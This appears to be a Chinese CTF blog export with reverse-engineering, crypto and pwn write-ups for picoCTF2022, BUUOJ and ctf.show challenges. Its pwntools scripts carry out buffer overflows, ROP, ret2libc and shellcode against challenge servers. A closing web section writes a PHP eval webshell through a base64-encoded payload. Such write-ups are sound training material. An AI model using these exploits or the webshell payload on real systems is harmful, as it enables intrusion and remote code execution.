隐蔽性：\n\n软件断点：\n软件断点会修改程序代码，因此可能会被一些反调试技术检测到。\n\n\n硬件断点：\n硬件断点不会修改程序代码，因此具有更高的隐蔽性。\n\n\n\n总结：\n\n软件断点灵活方便，适用于大多数调试场景，但可能会被反调试技术检测到。\n硬件断点隐蔽性高，适用于特殊调试场景，但数量有限\n\n\n\n条件断点\n条件断点是一种在调试器中设置的断点，它仅在满足特定条件时才会触发。在框位置输入条件\n\n\n\n更改字节选中要更改的那个字节\n右键\n\n更改之后Apply patch to 应用这个补丁\n[FlareOn6]Overlong\nelf文件动态调试1.找到ida的根目录，找到dbgsrv文件，在该文件中找到\n\n根据elf文件的进制选择（以64进制和snake.elf为例）\n将linux server64和snake拖入文件夹中\n之后在虚拟机终端内输出chmod +x linux_server64赋予文件执行权利\n之后输入./linux_server64运行文件（之后等待主机连接）\n再打开一个终端输入ip addr获取虚拟机ip地址\n检测是否可以成功：\n打开主机终端输入 ping  +虚拟机ip(下图即为来连接成功)\n\n之后打开Debugger&gt;Process options&gt;\n\n1:填snake在虚拟机中的位置\n2：填snake在虚拟机所在文件的文件位置\n3：填虚拟机ip\n4:运行.&#x2F;linux_server64后，输出Listening on 0.0.0.0:23946（一般默认）\n之后就可以正常运行（下次运行时在此运行.&#x2F;linux_server64，并把文件拖入想相同目录即可）\n显示所有机器码：​\tOptions&gt;general&gt;改为10\n\nx64dbgF2：设置断点。）F4：运行到光标处F7：单步步入。（遇到call指令，进入call函数的实现处继续执行汇编指令）F8：单步步过。（遇到call指令，执行call函数，之后接着执行call指令的下一条指令）F9：运行程序（如果没有碰到断点，程序会一直执行到结束。）\nCtrl+F9: 执行到函数返回处，用于跳出函数实现\nAlt+F9:执行到用户代码，用于快速跳出系统函数\nCtrl+G:输入十六进制地址，快速定位到该地址处\n","categories":["re_study"],"tags":["RE","花指令"]},{"title":"libc版本切换","url":"/2025/08/02/libc%E7%8E%AF%E5%A2%83%E5%88%87%E6%8D%A2/","content":"更换libc版本首先要拿到对应的libc.so文件\n然后查看版本\nstrings libc文件名 |grep ubuntu\n\n\n然后切换clibc版本\nlibc 文件名 libc版本信息\n\n\n查看libc版本通过got表泄露libc版本\n输出一个外置函数的got表地址\n然后在网站匹配之后下载\n下载没有的libc文件\nhttps://launchpad.net/ubuntu/+source/glibc/&lt;libc版本&gt; ##例如2.31-0ubuntu9.9\n\n\n\n把这两个文件下载到glibc-all-in-one中的debs\n然后去执行\n./extract debs/libc6_2.35-0ubuntu3.10_amd64.deb libs/2.35-0ubuntu3.10_amd64./extract debs/libc6-dbg_2.35-0ubuntu3.10_amd64.deb libs/2.35-0ubuntu3.10_amd64/.debug\n\n然后把解压出来的东西放在对应的libc文件处就可以了\n我的路径是File System&#x2F;&#x2F;lib&#x2F;freelibs&#x2F;对应文件夹\n","categories":["pwn_study"],"tags":["PWN"]},{"title":"orw","url":"/2025/08/04/orw/","content":"orw是open、read和write三个系统调用的缩写。orw 攻击是一种绕过沙箱（Sandbox）或NX保护的技术，其核心思想是：不直接获取shell，而是通过这三个系统调用来读取目标文件（通常是flag文件），然后将其内容打印到标准输出，从而获得flag。\n传统的缓冲区溢出攻击通常会尝试注入一段 shellcode，这段 shellcode 的作用是执行 execve(“&#x2F;bin&#x2F;sh”, NULL, NULL) 来获取一个交互式 shell。然而，在以下两种情况下，这种传统攻击会失败：\nNX（No-eXecute）保护：如果程序的栈是不可执行的，你注入的 shellcode 无法在栈上运行。\nseccomp 沙箱：一些程序会使用 seccomp（安全计算模式）来限制进程可以调用的系统调用。如果 execve 被禁用，即使你成功注入了 shellcode，它也无法执行。\n\n\n\n这个就是典型的orw\n用\nseccomp-tools dump ./orw #查看允许的函数调用\n\n\n脚本\nfrom pwn import *r = remote(&#x27;node5.buuoj.cn&#x27;,29475)context.log_level = &#x27;debug&#x27;elf = ELF(&#x27;orw&#x27;)shellcode = shellcraft.open(&#x27;/flag&#x27;)shellcode += shellcraft.read(&#x27;eax&#x27;,&#x27;esp&#x27;,100)shellcode += shellcraft.write(1,&#x27;esp&#x27;,100)shellcode = asm(shellcode)r.sendline(shellcode)r.interactive()\n\n","categories":["exercise_pwn"],"tags":["PWN","orw"]},{"title":"picoCTF2022","url":"/2025/07/10/picoCTF2022/","content":"CRYPTOVigenere题目信息\nkey CYLAB\ncipher:  rgnoDVD&#123;O0NU_WQ3_G1G3O3T3_A1AH3S_cc82272b&#125;\n题目给了密文和密钥，用随波逐流打开，解密，发现是维吉尼亚加密\n\nflag:picoCTF{D0NT_US3_V1G3N3R3_C1PH3R_ae82272q}\nbasic-mod1题目信息\n描述： 我们发现这个奇怪的消息在服务器上传递，我们认为我们有一个有效的 decrpytion 方案。取每个数字 mod 37 并将其映射到以下字符集：0-25 是字母表（大写），26-35 是十进制数字，36 是下划线。以 picoCTF 标志格式包装解密的消息（即 picoCTF{decrypted_message}）\n数字：350 63 353 198 114 369 346 184 202 322 94 235 114 110 185 188 225 212 366 374 261 213 \n按照题目信息对取模厚的数字根据其ASCLL码修改，并转化为字符输出\ndef simplify_numbers(numbers):    result = []    for num in numbers:        remainder = num % 37        if 0 &lt;= remainder &lt;= 25:            result.append(chr(ord(&#x27;A&#x27;) + remainder))        elif 26 &lt;= remainder &lt;= 35:            result.append(str(remainder - 26))        elif remainder == 36:            result.append(&#x27;_&#x27;)        else:            result.append(f&quot;[&#123;remainder&#125;]&quot;)    return &quot;&quot;.join(result)my_numbers = [350, 63, 353, 198, 114, 369, 346, 184, 202, 322, 94, 235, 114, 110, 185, 188, 225, 212, 366, 374, 261, 213]simplified_string = simplify_numbers(my_numbers)print(simplified_string)\n\nflag：picoCTF{R0UND_N_R0UND_ADD17EC2}\nsubstitution0题目信息\n描述：\n一条消息进来了，但似乎全都乱七八糟。幸运的是，它似乎一开始就有钥匙。你能破解这个替换密码吗？\n密文：\nOHNFUMWSVZLXEGCPTAJDYIRKQB \nSuauypcg Xuwaogf oacju, rvds o waoiu ogf jdoduxq ova, ogf hacywsd eu dsu huudxumace o wxojj noju vg rsvns vd roj ugnxcjuf. Vd roj o huoydvmyx jnoaohouyj, ogf, oddsod dveu, yglgcrg dc godyaoxvjdj—cm ncyaju o wauod pavbu vg o jnvugdvmvn pcvgdcm ivur. Dsuau ruau drc acygf hxonl jpcdj guoa cgu ukdauevdq cm dsu honl, ogf oxcgw cgu guoa dsu cdsua. Dsu jnoxuj ruau uknuufvgwxq soaf ogf wxcjjq, rvds oxx dsuoppuoaognu cm hyagvjsuf wcxf. Dsu ruvwsd cm dsu vgjund roj iuaq aueoalohxu, ogf,dolvgw oxx dsvgwj vgdc ncgjvfuaodvcg, V ncyxf soafxq hxoeu Zypvdua mca svj cpvgvcgaujpundvgw vd.\nDsu mxow vj: pvncNDM&#123;5YH5717Y710G_3I0XY710G_03055505&#125;\n解密\n猜测密钥凯撒密码加密，把第一句作为密钥\nflag; picoCTF{5UB5717U710N_3V0LU710N_03055505}\nRESafe Opener题目信息\n描述：你能打开这个保险箱吗？我忘记了保险箱的钥匙，但这个程序应该可以帮助我找回丢失的钥匙。你能帮我打开保险箱吗？将您恢复的密码放入 picoCTF 标志格式，例如：picoCTF{password}\n代码\nimport java.io.*;import java.util.*;  public class SafeOpener &#123;    public static void main(String args[]) throws IOException &#123;        BufferedReader keyboard = new BufferedReader(new InputStreamReader(System.in));        Base64.Encoder encoder = Base64.getEncoder();//Base6的编码器        String encodedkey = &quot;&quot;;        String key = &quot;&quot;;        int i = 0;        boolean isOpen;                while (i &lt; 3) &#123;            System.out.print(&quot;Enter password for the safe: &quot;);            key = keyboard.readLine();            encodedkey = encoder.encodeToString(key.getBytes());//对密码进行Base64加密            System.out.println(encodedkey);                          isOpen = openSafe(encodedkey);//调用方法进行核对            if (!isOpen) &#123;                System.out.println(&quot;You have  &quot; + (2 - i) + &quot; attempt(s) left&quot;);                i++;                continue;            &#125;            break;        &#125;    &#125;        public static boolean openSafe(String password) &#123;        String encodedkey = &quot;cGwzYXMzX2wzdF9tM18xbnQwX3RoM19zYWYz&quot;;//BASE64加密后的结果                if (password.equals(encodedkey)) &#123;            System.out.println(&quot;Sesame open&quot;);            return true;        &#125;        else &#123;            System.out.println(&quot;Password is incorrect\\n&quot;);            return false;        &#125;    &#125;&#125;\n\n\n\n正如代码中的注释一样，用户输入密码，进行Base64编码，调用函数检验编码厚的数值是否符合指定字符，所以密码就是指定字符Base64解码\n\nflag：picoCTF{pl3as3_l3t_m3_1nt0_th3_saf3}\nGDB test题目信息\n你能得到这面旗帜吗？\n以下是试用说明：\n$ chmod +x gdbme$ gdb gdbme(gdb) layout asm(gdb) break *(main+99)(gdb) run(gdb) jump *(main+104)\n\n解密\n按照给的命令进行操作\n\nflag: picoCTF{d3bugg3r_dr1v3_7776d758}\nfresh-java题目信息\n你能得到这面旗帜吗？对这个 Java 程序进行逆向工程\n用jad-gui打开这个文件，发现该密文已将被定义好了\n\nflag：picoCTF{700l1ng_r3qu1r3d_738cac89}\nfile-run1题目信息\n已为您提供一个程序，如果您尝试在命令行上运行它会发生什么？\n解密\n首先要为程序赋权限  chmod +x ru\n运行该程序并且执行命令.&#x2F;run\n\nflag:picoCTF{U51N6_Y0Ur_F1r57_F113_9bc52b6b}\nfile-run2题目信息\n另一个程序，但这一次，它似乎需要一些输入。如果您尝试在命令行上运行它并输入 “Hello！”会发生什么情况？\n解密\n首先要为程序赋权限  chmod +x ru\n运行该程序并且执行命令.&#x2F;run Hello!\n\nflag:picoCTF{F1r57_4rgum3n7_f65ed63e}\nBbbbloat题目信息\n你能得到这面旗帜吗？对这个二进制文件进行逆向工程。\n解密\n\n分析得到，最喜欢的是数字应该为549255\n为文件赋权限 chmod +x Bbbbloat\n运行程序./Bbbbloat\n\nflag：picoCTF{cu7_7h3_bl047_44f74a60}\nunpackme题目描述\n你能得到这面旗帜吗？对这个二进制文件进行逆向工程。\n解密\n文件以upx结尾，尝试upx脱壳\n\n之后拖入ida中\n\n发现最喜爱的数字是754635\n\nflag: picoCTF{up&gt;&lt;_m3_f7w_e510a27f}\nPWNRPS题目描述\n这是一个对你玩石头剪刀布的程序。我听说如果你连续赢了 5 次，就会发生好事。可以下载带有标记已编辑的程序源代码 这里 。\n解密\n主函数\nint main () &#123;  char input[3] = &#123;&#x27;\\0&#x27;&#125;;  int command;  int r;  puts(&quot;Welcome challenger to the game of Rock, Paper, Scissors&quot;);  puts(&quot;For anyone that beats me 5 times in a row, I will offer up a flag I found&quot;);  puts(&quot;Are you ready?&quot;);    while (true) &#123;    puts(&quot;Type &#x27;1&#x27; to play a game&quot;);    puts(&quot;Type &#x27;2&#x27; to exit the program&quot;);    r = tgetinput(input, 3);    // Timeout on user input    if(r == -3)    &#123;      printf(&quot;Goodbye!\\n&quot;);      exit(0);    &#125;    //前面那些都不重要            if ((command = strtol(input, NULL, 10)) == 0) &#123;      puts(&quot;Please put in a valid number&quot;);          &#125; else if (command == 1) &#123;      printf(&quot;\\n\\n&quot;);      if (play()) &#123;        wins++;      &#125; else &#123;        wins = 0;      &#125;      if (wins &gt;= 5) &#123;        puts(&quot;Congrats, here&#x27;s the flag!&quot;);        puts(flag);      &#125;    &#125; else if (command == 2) &#123;      return 0;    &#125; else &#123;      puts(&quot;Please type either 1 or 2&quot;);    &#125;  &#125;  return 0;&#125;\n\n判断胜负\n//判断胜负bool play () &#123;  char player_turn[100];  srand(time(0));//电脑的出拳设计  int r;  printf(&quot;Please make your selection (rock/paper/scissors):\\n&quot;);//校验  r = tgetinput(player_turn, 100);  if(r == -3)  &#123;    printf(&quot;Goodbye!\\n&quot;);    exit(0);  &#125;  int computer_turn = rand() % 3;//确保在3个手势中随机选择一个  printf(&quot;You played: %s\\n&quot;, player_turn);  printf(&quot;The computer played: %s\\n&quot;, hands[computer_turn]);  if (strstr(player_turn, loses[computer_turn])) &#123;//核验我们所出的是否包含胜利所需要底色那个手势    puts(&quot;You win! Play again?&quot;);    return true;  &#125; else &#123;    puts(&quot;Seems like you didn&#x27;t win this time. Play again?&quot;);    return false;  &#125;&#125;\n\n所以我们要经过5次循环，且每次循环都要向程序输出rock&#x2F;paper&#x2F;scissors的结合\n脚本from pwn import *p = remote(&#x27;saturn.picoctf.net&#x27;, 60179)for i in range(5):    p.sendline(b&#x27;1&#x27;)    p.sendline(b&#x27;rock/paper/scissors&#x27;)print(p.recvline_contains(b&#x27;picoCTF&#123;&#x27;))\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nbasic-file-exploit 漏洞题目信息\n提供的程序允许您写入文件并从中读取您写入的内容。试着玩弄它，看看你是否能打破它！可以下载带有标记已编辑的程序源代码 这里 \n解密\n有分析可得tgetinput用来校验空输入等基本校验工作，data_write数据输入，data_read数据读取，且其中包含flag的输出\n由main可以知道。首先选择要进行的模式，且第一次必须先存入，否则无法调用data_read函数\nstatic void data_read() &#123;  char entry[4];  long entry_number;  char output[100];  int r;  memset(output, &#x27;\\0&#x27;, 100);    printf(&quot;Please enter the entry number of your data:\\n&quot;);  r = tgetinput(entry, 4);  // Timeout on user input  if(r == -3)  &#123;    printf(&quot;Goodbye!\\n&quot;);    exit(0);  &#125;    if ((entry_number = strtol(entry, NULL, 10)) == 0) &#123;//尝试将 entry 字符串的开头部分解析成一个十进制的长整型数值，    puts(flag);    fseek(stdin, 0, SEEK_END);    exit(0);  &#125;  entry_number--;  strncpy(output, data[entry_number], input_lengths[entry_number]);  puts(output);&#125;\n\n所以重点就是((entry_number = strtol(entry, NULL, 10)) == 0)的输出结果为0\n\n\nflag:picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_68466E2F}\nbuffer overflow 0题目信息\n让我们从简单的开始，你能溢出正确的缓冲区吗？该程序可在此处获得。您可以查看源代码 这里 。\n解密\n主函数\n\n signal(11, sigsegv_handler)当程序发生段错误（即收到信号 11，也就是 SIGSEGV）时，不执行默认操作（崩溃），而是跳转到你定义的 sigsegv_handler 函数进行处理。 \n\n当你的程序试图访问非法内存地址（如未分配的内存、只读内存、已释放的内存等）时，操作系统会发送这个信号给程序。\n默认情况下，收到 SIGSEGV 会导致程序崩溃（段错误）。\n\n示例触发原因：\n\n解引用空指针：*NULL\n写入常量字符串：strcpy(&quot;hello&quot;, &quot;world&quot;)\n越界访问栈数组、堆数组\n使用未初始化的指针\n\n这个对flag.txt文件的操作 相当于bin&#x2F;sh后门函数\n它包含了读取flag,并把flag输出在终端\n而在 Linux&#x2F;Unix 系统中，/bin/sh 是一个指向系统默认 shell（如 Bash）的可执行文件\nsigsegv_handler函数\n\n该函数会输出flag\n所以只需要实现就可以输出flag\n\n脚本from pwn import *p = remote(&quot;saturn.picoctf.net&quot;, 62318)p.sendline(b&#x27;a&#x27;*20)p.interactive()\n\n\n\n\n\n\n\n\n\n\n\nbuffer overflow 1题目描述\n控制退货地址现在我们开始烹饪了！您可以溢出缓冲区并返回到程序中的 flag 函数。你可以在这里查看源代码。\n解密\n\n\nvar_4 是什么？\n\n在汇编或反编译工具（如 IDA Pro）中，var_4 是一个由工具自动生成的名称，用于表示一个位于栈上的局部变量。它通常是原始C代码中没有明确命名的变量，或者是编译器为了优化或内部使用而创建的栈空间。\n从图片中可以看到，var_4 位于 s 数组的下方（在栈帧中，局部变量通常从 EBP 往下分配）。\n\nvar_4 有多大？\n\n图片中 var_4 对应的汇编指令是 dd ?。\ndd 在汇编中是 “Define Doubleword” 的缩写。在 32 位系统中，一个 Doubleword 是 4 字节。\n因此，var_4 的大小是 4 字节。\n\n所以垃圾字节要填充36+4+4&#x3D;44个字节\n\nwin是后门函数\n填充它的地址\n脚本from pwn import *p = remote(&quot;saturn.picoctf.net&quot;, 59895)p.sendline(b&#x27;a&#x27;*44+p32(0x080491F6))p.interactive()\n\n\n\n\n\n\n\nbuffer overflow 2题目描述\n控制返回地址和参数这一次，您需要控制您返回的函数的参数！您可以从此程序中获取标志吗？你可以在这里查看源代码\n解密\n\ns距离返回地址是6C+4个字节\n\n要传参，32位是参数从右到左依次压入栈中\nwin的地址\n\ngdb动调查看python wp.py\n\n执行的函数列表\n脚本from pwn import *# 本地# ex = process(&#x27;./vuln&#x27;)# 远程p = remote(&#x27;saturn.picoctf.net&#x27;, 62974)payload = b&#x27;a&#x27;*112+p32(0x08049296)+p32(0)+p32(0xCAFEF00D)+p32(0xF00DF00D)p.sendline(payload)# p.interprint(p.recvall())\n\n\n\n\n\n\n\n\n\n\n\nx-sixty-what题目描述\n溢出 x64 代码在此之前的大多数问题是 32 位 x86。现在我们考虑 64 位 x86，它 只是有点不同！使缓冲区溢出，并将返回地址更改为 flag 函数。 下载源代码 。\n解密\n这一题我错了很久，最后发现考了堆栈平衡:crying_cat_face:\n但是也学到了一些gdb调试获取信息的方法\n\n\n\ngdb调试获得相关信息\nreadelf -s vuln显示所有函数的信息（在gdb调试之前）\n\np flag：显示函数flag的信息\n\n（gdb）disassemble vuln：找要填充的字节数（）\n64位时是0x40+8\n32位时是0x40+4\n\n堆栈平衡同一个程序的每一个 call 指令执行时，rsp（栈指针）的绝对值不一定相同，但其对齐状态是保持一致的。\n当 vuln 函数通过 ret 指令跳转到 flag 函数时，flag 函数的入口处 rsp (栈指针) 可能满足 rsp % 16 == 0 (即 16 字节对齐)。但是，flag 函数的序言 (prologue) 通常会 push rbp (将 rbp 压栈)，这会使 rsp 减去 8 字节，导致 rsp % 16 == 8 (8 字节不对齐)。\n问题就出在这里：在执行任何 call 指令之前，rsp 必须是 16 字节对齐的。\n所以该函数到flag之前要先到ret小工具\n使用 ROPgadget (推荐)： 在终端中运行（确保你的 vuln 可执行文件在当前目录）：\nBash\nROPgadget --binary ./vuln --only &quot;ret&quot;\n\n它会列出所有独立的 ret 指令地址。通常你可以选择其中一个地址最小的，或者你觉得“独立”的地址（例如，不在任何重要函数的中间）。0x0040101a 是一个非常常见的备选。\n在 GDB&#x2F;pwndbg 中手动查找： 启动 GDB 调试 ./vuln，然后使用 search-pattern 命令查找 ret 指令的机器码 \\xc3：\nCode snippet\nsearch-pattern &#x27;\\xc3&#x27;\n\n你也可以使用 disassemble &lt;section_start_address&gt;, &lt;section_end_address&gt; 来反汇编整个代码段，然后手动查找 ret。\n直接看出堆栈不平衡\n该函数是flag被调用函数输出flag，所以在flag函数中的第一个call的地方下断点\npython 你的脚本文件名.py：运行脚本\ninfo registers rsp：查看rsp的寄存器信息\n\n看最后两位  \n0x48可以整除16，所以现在堆栈平衡了\n脚本from pwn import *# p = process(&#x27;./vuln&#x27;)# gdb.attach(p, gdbscript=&#x27;b *0x08049370\\ncontinue&#x27;)p = remote(&quot;saturn.picoctf.net&quot;, 50442)# 之前找到的 flag 函数地址flag_address = 0x00401236 # 在你的二进制文件中找到一个 ret 小工具的地址# 假设你找到的是 0x0040101a，请替换为你在 GDB/ROPgadget 中找到的实际地址ret_gadget_address = 0x0040101a # 构建 payload：填充 + ret_gadget_address + flag_addresspayload = b&#x27;A&#x27; * (0x40 + 8) + p64(ret_gadget_address) + p64(flag_address)p.sendline(payload)print(p.recvall())\n\n","categories":["WP"],"tags":["WP"]},{"title":"pwn49","url":"/2025/07/26/pwn49/","content":"题目\n\n\n看出是静态编译，考虑用mprotect来修改它的权限\n\nctrl+s查看bss段，找要修改的范围\n\n因为mprotect的地址选择的限制条件\n我们把页面边界定为0x80DA000\n接着就可以构造payload了\n先调用mprotect函数修改权限，再用read函数把后门函数读入这个位置\n之后控制返回地址让程序回到这个地方执行后门函数\n脚本from pwn import *#p=process(&quot;./pwn49&quot;)context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)#gdb.attach(p,&quot;b*0x0000000000400737&quot;)p=remote( &quot;pwn.challenge.ctf.show&quot;,28242)elf=ELF(&quot;./pwn49&quot;)edx_ecx_ebx=0x08056194mprotect=0x0806cdd0start=0x80DA000read=elf.sym[&quot;read&quot;]payload=b&#x27;a&#x27;*(0x12+4)+p32(mprotect)payload += p32(edx_ecx_ebx) + p32(start) + p32(1000) + p32(7)payload+=p32(read)+p32(edx_ecx_ebx)+p32(0)+p32(start)+p32(1000)+p32(start)p.sendline(payload)payload=asm(shellcraft.sh())p.sendline(payload)p.interactive()\n\n（找pop_ret时只需要控制是pop了那三个寄存器就可以）\nmprotect\nmprotect 系统调用有严格的页面对齐要求：\n\n起始地址必须是页面边界（4KB个字节的倍数）（4KB&#x3D;1000字节)\n长度会被向上舍入到页面边界\n区间长度 len 必须是页大小的整数倍\n\n假设你的 BSS 段开始于 0x80DB320,len长度为1000：\n内存布局：\n0x80DA000 ┌─────────────────┐ ← 页面边界（4KB对齐）​          │     页面1        │​          │                 │0x80DB320 ┌─────────────────┐ ← BSS段开始​          │     BSS段       │​          │                 │0x80DBFFF └─────────────────┘ ← 页面1结束0x80DC000 ┌─────────────────┐ ← 下一个页面边界\n\n","categories":["exercise_pwn"],"tags":["PWN","mprotect","静态编译"]},{"title":"ret2libc-printf","url":"/2025/07/20/ret2libc-printf/","content":"严格符合printf的格式[HarekazeCTF2019]baby_rop2\n\n\n而且函数中没有system函数和相应字符串\n要泄露libc的地址\n\n通过read读取数据，用printf打印出来\nprintf 函数的 GOT 地址不能用来泄露 printf 自己的地址？\n是的，这是个鸡生蛋蛋生鸡 的问题：\n\nprintf@got 保存的是 printf 的真实地址（libc 中的地址）。\n但你要调用 printf 才能打印它，而调用 printf 又依赖 GOT 表项的地址。\n如果 GOT 表项还没解析（延迟绑定），它指向 PLT stub，不是真实地址。\n即使 GOT 表项已解析，你也无法通过 printf(&quot;%s&quot;, printf_got) 正确读取地址。\n\n🧠 总结对比\n\n\n\n\n\n\n\n\n\nputs(puts_got)\n✅ 可行\nputs会尝试打印从puts_got开始的内容，libc 中有字符串，不会崩溃\n\n\nprintf(&quot;%s&quot;, printf_got)\n❌ 不可行\nprintf会尝试从printf_got地址读取字符串，但那是个函数地址，不是字符串\n\n\nprintf(&quot;%p&quot;, printf_got)\n✅ 可行（需构造）\n可以打印地址，但需要正确设置格式字符串\n\n\nprintf(&quot;%s&quot;, read_got)\n✅ 可行（偶尔）\nread_got指向的地址附近可能有字符串，可以打印出来\n\n\nputs(printf_got)\n✅ 可行（偶尔）\n同上，但依赖 libc 中的字符串\n\n\n要调用printf函数进行泄露，就要根据其特性来传参，printf函数有两个参数，一个格式化字符串，一个可变参数列表\n\nRDI、RSI、RDX、RCX、R8、R9参数按照这个顺序传入寄存器中\n有单独的rdi\n所以rdi&#x3D;0x400733\n但没有单独对rsi的处理\n所以rsi_r15&#x3D;0x400731，对r15随便传入一个数就可\n第一次payload的构造\npayload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(format_str)payload+=p64(pop_rsi_r15)+p64(read_got)+p64(0)payload+=p64(printf_plt)+p64(main_plt)p.recvuntil(b&quot;name? &quot;)p.sendline(payload)read= u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:] + b&#x27;\\0\\0&#x27;)print(hex(read))\n\n\n\n第二次通过计算出libc的基址，加上偏移量就得到了需要的函数的地址，就可与i进行构造了\npayload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)\n\n\n\n\n\n\n\n脚本\nfrom pwn import *from LibcSearcher import *context.log_level = &#x27;debug&#x27;#p = process(&#x27;./babyrop2&#x27;)p = remote(&quot;node5.buuoj.cn&quot;,25235)elf = ELF(&#x27;./babyrop2&#x27;)pop_rdi = 0x0000000000400733pop_rsi_r15 = 0x0000000000400731 format_str = 0x0000000000400770  ret_addr = 0x0000000000400734printf_plt = elf.plt[&#x27;printf&#x27;]read_got = elf.got[&#x27;read&#x27;]main_plt = 0x400636payload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(format_str)payload+=p64(pop_rsi_r15)+p64(read_got)+p64(0)payload+=p64(printf_plt)+p64(main_plt)p.recvuntil(b&quot;name? &quot;)p.sendline(payload)read= u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:] + b&#x27;\\0\\0&#x27;)print(hex(read))libc = LibcSearcher(&#x27;read&#x27;, read)libc_base = read - libc.dump(&#x27;read&#x27;)sys_addr = libc_base + libc.dump(&#x27;system&#x27;)bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)payload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)p.sendline(payload)p.interactive()\n\n\n\n\n\n\n\n单个函数pwn2_sctf_2016\n\n\n\n首先看到题目输入一个小于32的数，并把这个数当作get输入的最大限制\n所以可以输入一个负数来解决这个限制\n也是没有system函数的相关内容\n考虑泄露libc的地址\n:detective:用printf打印，可以用printf的got表、\n因为你调用了 printf(printf_got)。\n对于 printf 来说：\n\n它看不到这是一个整数地址\n\n它只是把你给的指针当作一个字符串格式解析\n\n如果你传入的这个地址是可读的内存，它就会按照那块内存的内容当作字符串去输出\n所以如果只是传一个参数，printf函数会刚好把它当作字符串\n刚好解决了传递它本身的got表地址，和只有一个参数的问题\npayload=b&#x27;a&#x27; * (0x2c+4) + p32(printf_plt) + p32(main) + p32(printf_got)\n\n之后就是标准流程\n就是记得返回地址是main函数\n要再次输入依次那个负数\n脚本\nfrom pwn import *from LibcSearcher import *from time import sleepr = remote(&quot;node5.buuoj.cn&quot;,28640)elf = ELF(&#x27;./pwn2_sctf_2016&#x27;)printf_plt = elf.plt[&#x27;printf&#x27;]printf_got = elf.got[&#x27;printf&#x27;]main= elf.sym[&#x27;main&#x27;]r.recvuntil(b&#x27;read?&#x27;)r.sendline(b&#x27;-1&#x27;)r.recvuntil(b&quot;data!\\n&quot;)payload = b&#x27;a&#x27; * (0x2c+4)payload += p32(printf_plt) + p32(main) + p32(printf_got)r.sendline(payload)r.recvuntil(&#x27;\\n&#x27;)printf_addr=u32(r.recv(4))#接受libc = LibcSearcher(&#x27;printf&#x27;,printf_addr)base = printf_addr - libc.dump(&#x27;printf&#x27;)system_addr = base + libc.dump(&#x27;system&#x27;)bin_sh = base + libc.dump(&#x27;str_bin_sh&#x27;)r.recvuntil(b&#x27;How many bytes do you want me to read?&#x27;)r.sendline(b&#x27;-1&#x27;)r.recvuntil(b&quot;data!\\n&quot;)payload = b&#x27;a&#x27; * (0x2c+4) + p32(system_addr) + p32(main) + p32(bin_sh)r.sendline(payload)r.interactive()\n\n\n\n","categories":["exercise_pwn"],"tags":["PWN","ret2libc-printf"]},{"title":"御网杯线下2025","url":"/2025/07/14/%E5%BE%A1%E7%BD%91%E6%9D%AF2025%E7%BA%BF%E4%B8%8B/","content":"re_c\n\nFLAG:flag{HNCTFmng1}\nre_python\n得到\n\n\n脚本\nc = [144, 163, 158, 177, 121, 39, 58, 58, 91, 111, 25, 158, 72, 53, 152,      78, 171, 12, 53, 105, 45, 12, 12, 53, 12, 171, 111, 91, 53,      152, 105, 45, 152, 144, 39, 171, 45, 91, 78, 45, 158, 8]flag=&quot;&quot;for i in range(42):    for j in range (128):        if j * 33 % 179 == c[i]:            flag+=chr(j)print(flag)#flag&#123;2889e7a3-0d6b-4cbb-b6e9-04c0f26c9dca&#125;\n\n再替换一下\n\ncrypto1\n放到随波逐流里面能看到Rot13解码之后是明显的16进制编码形式\n\n\n经过16进制转字符后特征很明显，最后Base32-&gt;Base64-&gt;Ascii85混合解码得到flag。\nCrypto_10看到题目描述重排时序 62星序猜测倒序和Base62。\n\n倒序：\n\nBase62解码：\n\ncrypto解压这个文件夹打开下载的附件，有一个压缩包和一张图片。直接解压文件夹需要密码，图片也不能直接打开。\n\n\n图片用010打开发现文件头是错的修改一下，得到解压密码。\n\n压缩包解压得到flag.jpg直接放随波逐流里然后base64解码。\n\n\n得到ctf_you_passed包裹flag{}就是最后的flag。\ncrypto encryption2from secret import init1,init2,init3,FLAGimport hashlibassert(FLAG==&quot;flag&#123;&quot;+hashlib.sha256(init1+init2+init3).hexdigest()+&quot;&#125;&quot;)classlfsr():    def__init__(self, init, mask, length):        self.init = init        self.mask = mask        self.lengthmask = 2**(length+1)-1    defnext(self):        nextdata = (self.init &lt;&lt; 1) &amp; self.lengthmask         i = self.init &amp; self.mask &amp; self.lengthmask         output = 0        while i != 0:            output ^= (i &amp; 1)            i = i &gt;&gt; 1        nextdata ^= output        self.init = nextdata        return outputdefcombine(x1,x2,x3):    return (x1*x2)^(x2*x3)^(x1*x3)if __name__==&quot;__main__&quot;:    l1 = lfsr(int.from_bytes(init1,&quot;big&quot;),0b100000000000000000000000010000000000000000000000,48)    l2 = lfsr(int.from_bytes(init2,&quot;big&quot;),0b100000000000000000000000000000000010000000000000,48)    l3 = lfsr(int.from_bytes(init3,&quot;big&quot;),0b100000100000000000000000000000000000000000000000,48)    withopen(&quot;keystream&quot;,&quot;wb&quot;) as f:        for i inrange(8192):            b = 0            for j inrange(8):                b = (b&lt;&lt;1)+combine(l1.next(),l2.next(),l3.next())            f.write(chr(b).encode())\n\n\n\nMisc1题目附件是一个加密的压缩包，直接爆破。\n\n打开文档全选复制\n\n粘贴一下就能看到flag\n\nMisc2 键盘流量\nMisc3 数据包分析附件里的.exe是压缩包，修改后缀解压。\n\n找到流量包全局搜索flag以及flag其他编码形式。\n\n16进制解码\n\nMisc4工业流量分析\n\n按照时间排序，最先STOP的包。\nflag&#123;ac6417423bb3000c&#125;\n\n\n\nweb rce方法一（打印编码的flag）ip/?cmd=print(base64_encode(file_get_contents(base64_decode(&quot;ZmxhZy5waHA=&quot;))));\n\n方法二（写入webshell）直接写入一个webshell\nfile_put_contents(    base64_decode(&quot;c2hlbGwucGhw&quot;),  // &quot;shell.php&quot;    base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUW3hdKTs/Pg==&quot;)  // &quot;&lt;?php @eval(\\$_POST[x]); 